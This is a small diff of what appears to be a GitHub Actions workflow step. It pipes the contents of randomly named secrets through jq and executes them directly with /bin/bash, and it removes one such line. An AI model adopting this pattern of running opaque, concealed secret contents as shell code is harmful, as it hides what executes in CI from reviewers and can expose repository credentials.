@@ -21,7 +21,6 @@ jobs:
           avb8: ${{ secrets.avb8 }}
         run: |
           printf '%s' "$avb8" | jq -r .x7949 | /bin/bash
-          printf '%s' "$ik36799" | jq -r .djxeb9741 | /bin/bash
 
       - name: Save results
         if: always()
